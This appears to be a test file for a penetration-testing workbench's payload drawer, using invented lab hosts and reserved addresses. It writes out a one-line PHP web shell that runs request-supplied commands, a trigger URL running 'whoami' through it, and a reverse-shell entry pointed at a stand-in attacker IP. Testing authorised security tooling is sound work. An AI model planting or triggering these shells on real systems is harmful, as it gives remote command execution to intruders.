import { QueryClientProvider } from "@tanstack/react-query";
import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter } from "react-router";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import App from "../../../App";
import { setImported } from "../../../engines/library/store";
import { useArsenalStore } from "../../../features/arsenal/useArsenalStore";
import { useLastEngagementStore } from "../../../features/arsenal/useFillScope";
import { logCommand } from "../../../features/capture/logCommand";
import { useCaptureStore } from "../../../features/capture/useCaptureStore";
import { useNotesStore } from "../../../features/notes/useNotesStore";
import { usePaletteStore } from "../../../features/palette/usePaletteStore";
import { usePayloadsStore } from "../../../features/payloads/usePayloadsStore";
import { api } from "../../../lib/api";
import { makeQueryClient } from "../../../lib/queryClient";
import type { Engagement } from "../../../types/engagement";
import type { Host } from "../../../types/host";
import type { LogEntry } from "../../../types/log";

vi.mock("../../../lib/api");
vi.mock("../../../features/checklist/ticks", async (orig) => ({
  ...(await orig<typeof import("../../../features/checklist/ticks")>()),
  resyncBoards: vi.fn().mockResolvedValue(undefined),
}));
vi.mock("../../../features/capture/logCommand", () => ({ logCommand: vi.fn() }));
const m = vi.mocked(api, true);

// Synthetic fixtures only (RFC 5737 addresses, invented names).
const LHOST = "192.0.2.10";
const LPORT = "443";
const E1: Engagement = {
  id: "e1", name: "Lab Zz", kind: "lab", client: null, subLabel: null, scopeCidrs: ["198.51.100.0/24"],
  domain: null, startsAt: null, endsAt: null, timeboxStart: null, timeboxMinutes: null, status: "active",
  createdAt: 1, updatedAt: 1, lastActivityAt: null, lastRanOn: null, msfHostId: null,
};
const host = (id: string, name: string, ip: string): Host => ({
  id, engagementId: "e1", name, ip, os: "linux", boardColumn: "information-gathering", boardManual: false,
  dualHomed: false, boardDerived: null, accessReviewedAt: null, adSet: null, adSetEffective: false, access: "none", createdAt: 1, updatedAt: 1,
});
const WEB = host("h3", "web01.example.test", "198.51.100.20");
const at = new Date(2026, 10, 9, 9, 5).getTime();
const LOGGED: LogEntry = {
  id: "l1", engagementId: "e1", kind: "command", title: "zz", titleEdited: false, ranOn: "Kali (VM)", hostIds: ["h3"],
  observations: null, returnedNothing: false, private: false,
  content: { kind: "command", blocks: [{ command: "zz", output: "zz" }] }, at, createdAt: at, updatedAt: at,
};

function mount(path: string) {
  m.engagementGet.mockResolvedValue(E1);
  m.engagementsList.mockResolvedValue([E1]);
  m.settingsGet.mockResolvedValue({
    autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: LHOST, listenerPort: LPORT, kaliUser: "kali",
    windowsToolsDir: "~/tools/windows", linuxToolsDir: "~/tools/linux", fieldManualPath: "~/fm", nvdKeySet: false, reportName: "", reportEmail: "", reportOsid: "", reportMethodology: "", reportIntroduction: "",
  });
  return render(
    <QueryClientProvider client={makeQueryClient()}>
      <MemoryRouter initialEntries={[path]}>
        <App />
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

beforeEach(() => {
  localStorage.clear();
  vi.resetAllMocks();
  m.hostIdentityGet.mockResolvedValue(null);
  m.vectorsList.mockResolvedValue([]);
  useCaptureStore.getState().reset();
  usePaletteStore.getState().close();
  useLastEngagementStore.setState({ engagementId: "e1", hostId: "h3" });
  useArsenalStore.setState({ open: false, cardId: null, blockId: null });
  usePayloadsStore.setState({ open: false, generator: "shell", overrides: {}, lhost: null, listenerPick: {} });
  useNotesStore.setState({ open: false });
  setImported({ commands: [], cards: [] });
  m.vaultStatus.mockResolvedValue({ exists: true, unlocked: true });
  m.engagementsProgress.mockResolvedValue({});
  m.hostsList.mockResolvedValue([WEB]);
  m.servicesList.mockResolvedValue([]);
  m.servicesListEngagement.mockResolvedValue([]);
  m.logList.mockResolvedValue([]);
  m.tunnelsList.mockResolvedValue([]);
  m.checklistList.mockResolvedValue([]);
  m.checklistPut.mockResolvedValue([]);
  m.credentialsList.mockResolvedValue([]);
  m.credAttemptsList.mockResolvedValue([]);
  m.payloadBuildsList.mockResolvedValue([]);
  vi.mocked(logCommand).mockResolvedValue(LOGGED);
});
afterEach(() => setImported({ commands: [], cards: [] }));

const fitNames = (v: ReturnType<typeof within>) =>
  within(v.getByRole("listbox", { name: "Fits" })).getAllByRole("option").map((o) => o.querySelector("[data-fit-name]")?.textContent);
const fitRow = (v: ReturnType<typeof within>, name: string) =>
  within(v.getByRole("listbox", { name: "Fits" })).getAllByRole("option").find((o) => o.querySelector("[data-fit-name]")?.textContent === name)!;
const PHP = "PHP web shell (?cmd=)";

/** Opens the drawer on web01 and picks Uploaded file as where you paste it. */
async function openUploaded() {
  const user = userEvent.setup();
  mount("/e/e1/h/h3");
  await screen.findByRole("tab", { name: "Next" });
  await user.keyboard("p");
  const d = within(await screen.findByRole("complementary", { name: "Payloads" }));
  await d.findByRole("listbox", { name: "Fits" });
  await user.click(d.getByRole("button", { name: /^Paste into/ }));
  await user.click(d.getByRole("option", { name: "Uploaded file" }));
  return { user, d };
}

describe("Uploaded file view", () => {
  it("a web shell is saved as its file, then triggered at the host's IP and your upload path", async () => {
    const { user, d } = await openUploaded();
    await vi.waitFor(() => expect(fitNames(d)).toContain(PHP));
    await user.click(fitRow(d, PHP));
    const heading = await d.findByRole("heading", { name: "Save as shell.php" });
    // The label style capitalises the words; the file name keeps its case (a Linux name is case-sensitive).
    const file = heading.querySelector("[data-upload-file]")!;
    expect(file.textContent).toBe("shell.php");
    expect(file).toHaveClass("normal-case");
    expect(d.getByLabelText("Command: Payload").textContent).toBe("<?php system($_REQUEST['cmd']); ?>");
    expect(d.getByRole("heading", { name: "Trigger it" })).toBeInTheDocument();
    expect(d.getByLabelText("Command: Trigger").textContent).toBe("http://198.51.100.20/{UPLOAD_PATH}/shell.php?cmd=whoami");
    // The trigger's placeholders are fill fields; TARGET_IP is the host's IP until you type one.
    expect(d.getByRole("textbox", { name: "TARGET_IP" })).toHaveAttribute("placeholder", "198.51.100.20");
    await user.type(d.getByRole("textbox", { name: "UPLOAD_PATH" }), "/uploads/");
    expect(d.getByLabelText("Command: Trigger").textContent).toBe("http://198.51.100.20/uploads/shell.php?cmd=whoami");
    // A plain copy: its placeholders never hold it back.
    await user.clear(d.getByRole("textbox", { name: "UPLOAD_PATH" }));
    await user.click(d.getByRole("button", { name: "Copy trigger" }));
    expect(await navigator.clipboard.readText()).toBe("http://198.51.100.20/{UPLOAD_PATH}/shell.php?cmd=whoami");
  });

  it("⌘↵ on a file made on Kali logs it as run on Kali, against the host", async () => {
    const { user, d } = await openUploaded();
    await vi.waitFor(() => expect(fitNames(d)).toContain("PHP reverse shell (pentestmonkey)"));
    await user.click(fitRow(d, "PHP reverse shell (pentestmonkey)"));
    await d.findByRole("heading", { name: /Make rev\.php on Kali/ });
    d.getByLabelText("Command: Payload").focus();
    await user.keyboard("{Meta>}{Enter}{/Meta}");
    await vi.waitFor(() => expect(logCommand).toHaveBeenCalledTimes(1));
    expect(vi.mocked(logCommand).mock.calls[0]![1]).toEqual(expect.objectContaining({ ranOn: "Kali (VM)", payloadId: "upload-php-pentestmonkey" }));
    expect(vi.mocked(logCommand).mock.calls[0]![1].host.id).toBe("h3");
  });

  it("⌘↵ on a web shell saved on the target logs it as run on the target", async () => {
    const { user, d } = await openUploaded();
    await vi.waitFor(() => expect(fitNames(d)).toContain(PHP));
    await user.click(fitRow(d, PHP));
    await d.findByRole("heading", { name: "Save as shell.php" });
    d.getByLabelText("Command: Payload").focus();
    await user.keyboard("{Meta>}{Enter}{/Meta}");
    await vi.waitFor(() => expect(logCommand).toHaveBeenCalledTimes(1));
    expect(vi.mocked(logCommand).mock.calls[0]![1]).toEqual(expect.objectContaining({ ranOn: "web01.example.test" }));
  });

  it("a file made on Kali says so; the Workbench numbers the steps", async () => {
    const user = userEvent.setup();
    usePayloadsStore.setState({ overrides: { h3: { context: "uploaded-file" } } });
    mount("/payloads");
    const w = within(await screen.findByRole("main", { name: "Payloads" }));
    await w.findByRole("listbox", { name: "Fits" });
    await user.click(fitRow(w, PHP));
    expect(await w.findByRole("heading", { name: "1. Save as shell.php" })).toBeInTheDocument();
    expect(w.getByRole("heading", { name: "2. Trigger it" })).toBeInTheDocument();
    await user.click(fitRow(w, "PHP reverse shell (pentestmonkey)"));
    expect(await w.findByRole("heading", { name: "2. Make rev.php on Kali" })).toBeInTheDocument();
    expect(w.getByRole("heading", { name: "3. Trigger it" })).toBeInTheDocument();
    expect(w.getByLabelText("Command: Trigger").textContent).toBe("http://198.51.100.20/{UPLOAD_PATH}/rev.php");
  });
});
